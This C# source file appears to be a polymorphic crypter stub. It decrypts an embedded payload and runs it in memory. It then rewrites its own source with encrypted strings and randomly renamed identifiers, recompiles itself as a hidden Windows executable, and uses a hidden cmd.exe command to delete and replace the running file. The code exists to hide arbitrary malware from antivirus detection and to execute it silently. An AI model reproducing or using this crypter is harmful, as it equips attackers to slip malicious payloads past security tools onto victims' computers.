using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

class _V_Stub
{
	static Random _V_Random = new Random(Environment.TickCount);
	static string _V_Main_ObfuscationCharacters = "각갂갃간갅갆갇갈갉갊갋갌갍갎갏감갑값갓갔강갖갗갘같갚갛개객갞갟갠갡갢갣갤갥갦갧갨갩갪갫갬갭갮갯";

	static void Main()
	{
		byte[] _V_Main_Payload = _V_Decompress(_V_DecryptData(_CONST_EncryptedPayload));
		Assembly.Load(_V_Main_Payload).GetTypes()[0].GetMethod("Main").Invoke(null, new object[0]);
		string _V_Main_OutputAssembly = _V_GetVariableName() + ".exe";

		CodeDomProvider _V_Main_Compiler = CodeDomProvider.CreateProvider("CSharp");
		CompilerParameters _V_Main_Parameters = new CompilerParameters
		{
			GenerateExecutable = true,
			GenerateInMemory = true,
			OutputAssembly = Path.Combine(Application.StartupPath, _V_Main_OutputAssembly),
			CompilerOptions = "/target:winexe /platform:x86"
		};

		_V_Main_Parameters.ReferencedAssemblies.Add("mscorlib.dll");
		_V_Main_Parameters.ReferencedAssemblies.Add("System.dll");
		_V_Main_Parameters.ReferencedAssemblies.Add("System.Core.dll");
		_V_Main_Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");

		string _V_Main_OriginalStubCode = Encoding.UTF8.GetString(_V_Decompress(_V_DecryptData(_CONST_EncryptedStubCode)));
		string _V_Main_StubCode = _V_Main_OriginalStubCode;

		while (_V_Main_StubCode.Contains('\x22'))
		{
			int _V_Main_StringLiteralStart = _V_Main_StubCode.IndexOf('\x22');
			string _V_Main_StringLiteral = _V_Main_StubCode.Substring(_V_Main_StringLiteralStart, _V_Main_StubCode.IndexOf('\x22', _V_Main_StringLiteralStart + 1) - _V_Main_StringLiteralStart + 1);
			_V_Main_StubCode = _V_Main_StubCode.Replace(_V_Main_StringLiteral, "_V_DecryptString(" + '\x40' + _V_EncryptString(_V_Main_StringLiteral.Substring(1, _V_Main_StringLiteral.Length - 2)) + '\x40' + ")");
		}
		while (_V_Main_StubCode.Contains("_V" + "_"))
		{
			_V_Main_StubCode = _V_Main_StubCode.Replace(new string(_V_Main_StubCode.Substring(_V_Main_StubCode.IndexOf("_V" + "_")).TakeWhile(_V_Main_Character => "abcdefghijklmnopqrstuvwxyz0123456789_".Contains(char.ToLower(_V_Main_Character))).ToArray()), _V_GetVariableName());
		}
		_V_Main_StubCode = _V_Main_StubCode.Replace('\x40', '\x22');

		_V_Main_StubCode = _V_Main_StubCode
			.Replace("_CONST_" + "EncryptedStubCode", "new byte[]{" + string.Join(",", _V_EncryptData(_V_Compress(Encoding.UTF8.GetBytes(_V_Main_OriginalStubCode))).Select(_V_Main_Byte2 => _V_Main_Byte2.ToString())) + "}")
			.Replace("_CONST_" + "EncryptedPayload", "new byte[]{" + string.Join(",", _V_EncryptData(_V_Compress(_V_Main_Payload)).Select(_V_Main_Byte3 => _V_Main_Byte3.ToString())) + "}");
		_V_Main_Compiler.CompileAssemblyFromSource(_V_Main_Parameters, _V_Main_StubCode);

		File.WriteAllText("Debug_MorphedStub.cs", _V_Main_StubCode, Encoding.UTF8);
		File.WriteAllText("Debug_MorphedStub_Original.cs", _V_Main_OriginalStubCode, Encoding.UTF8);

		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd.exe",
			Arguments = "/C ping 1.1.1.1 -n 1 -w 1000 > Nul & Del " + '\x22' + Application.ExecutablePath + '\x22' + " & move " + '\x22' + _V_Main_OutputAssembly + '\x22' + " " + '\x22' + Application.ExecutablePath + '\x22',
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
		});
	}

	static byte[] _V_Compress(byte[] _V__Compress_Data)
	{
		MemoryStream _V__Compress_MemoryStream = new MemoryStream();
		GZipStream _V__Compress_Zip = new GZipStream(_V__Compress_MemoryStream, CompressionMode.Compress, true);
		_V__Compress_Zip.Write(_V__Compress_Data, 0, _V__Compress_Data.Length);
		_V__Compress_Zip.Close();
		_V__Compress_MemoryStream.Position = 0;
		byte[] _V__Compress_Compressed = new byte[_V__Compress_MemoryStream.Length];
		_V__Compress_MemoryStream.Read(_V__Compress_Compressed, 0, _V__Compress_Compressed.Length);
		byte[] _V__Compress_Buffer = new byte[_V__Compress_Compressed.Length + 4];
		Buffer.BlockCopy(_V__Compress_Compressed, 0, _V__Compress_Buffer, 4, _V__Compress_Compressed.Length);
		Buffer.BlockCopy(BitConverter.GetBytes(_V__Compress_Data.Length), 0, _V__Compress_Buffer, 0, 4);
		return _V__Compress_Buffer;
	}
	static byte[] _V_Decompress(byte[] _V__Decompress_Data)
	{
		MemoryStream _V__Decompress_MemoryStream = new MemoryStream();
		int _V__Decompress_Length = BitConverter.ToInt32(_V__Decompress_Data, 0);
		_V__Decompress_MemoryStream.Write(_V__Decompress_Data, 4, _V__Decompress_Data.Length - 4);
		byte[] _V__Decompress_Buffer = new byte[_V__Decompress_Length];
		_V__Decompress_MemoryStream.Position = 0;
		GZipStream _V__Decompress_Zip = new GZipStream(_V__Decompress_MemoryStream, CompressionMode.Decompress);
		_V__Decompress_Zip.Read(_V__Decompress_Buffer, 0, _V__Decompress_Buffer.Length);
		return _V__Decompress_Buffer;
	}
	static byte[] _V_EncryptData(byte[] _V__EncryptData_Data)
	{
		Aes _V__EncryptData_Aes = Aes.Create();
		_V__EncryptData_Aes.GenerateIV();
		_V__EncryptData_Aes.Key = _V__EncryptData_Aes.IV;
		MemoryStream _V__EncryptData_MemoryStream = new MemoryStream();
		_V__EncryptData_MemoryStream.Write(_V__EncryptData_Aes.Key, 0, 16);
		CryptoStream _V__EncryptData_CryptoStream = new CryptoStream(_V__EncryptData_MemoryStream, _V__EncryptData_Aes.CreateEncryptor(), CryptoStreamMode.Write);
		_V__EncryptData_CryptoStream.Write(_V__EncryptData_Data, 0, _V__EncryptData_Data.Length);
		_V__EncryptData_CryptoStream.Close();
		return _V__EncryptData_MemoryStream.ToArray();
	}
	static byte[] _V_DecryptData(byte[] _V__DecryptData_Data)
	{
		byte[] _V__DecryptData_Key = new byte[16];
		Buffer.BlockCopy(_V__DecryptData_Data, 0, _V__DecryptData_Key, 0, 16);
		Aes _V__DecryptData_Aes = Aes.Create();
		_V__DecryptData_Aes.IV = _V__DecryptData_Key;
		_V__DecryptData_Aes.Key = _V__DecryptData_Key;
		MemoryStream _V__DecryptData_MemoryStream = new MemoryStream();
		CryptoStream _V__DecryptData_CryptoStream = new CryptoStream(_V__DecryptData_MemoryStream, _V__DecryptData_Aes.CreateDecryptor(), CryptoStreamMode.Write);
		_V__DecryptData_CryptoStream.Write(_V__DecryptData_Data, 16, _V__DecryptData_Data.Length - 16);
		_V__DecryptData_CryptoStream.Close();
		return _V__DecryptData_MemoryStream.ToArray();
	}
	static string _V_EncryptString(string _V__EncryptString_String)
	{
		int _V__EncryptString_Key = _V_Random.Next(256);
		return (char)(_V__EncryptString_Key + 42784) + new string(_V__EncryptString_String.Select(_V__EncryptString_Character => (char)((_V__EncryptString_Character ^ _V__EncryptString_Key) + 42784)).ToArray());
	}
	static string _V_DecryptString(string _V__DecryptString_String)
	{
		int _V__DecryptString_Key = _V__DecryptString_String[0] - 42784;
		return new string(_V__DecryptString_String.Substring(1).Select(_V__DecryptString_Character => (char)((_V__DecryptString_Character - 42784) ^ _V__DecryptString_Key)).ToArray());
	}
	static string _V_GetVariableName()
	{
		return new string(Enumerable.Range(0, _V_Random.Next(5, 15)).Select(_V__GetVariableName_Index => _V_Main_ObfuscationCharacters[_V_Random.Next(_V_Main_ObfuscationCharacters.Length)]).ToArray());
	}
}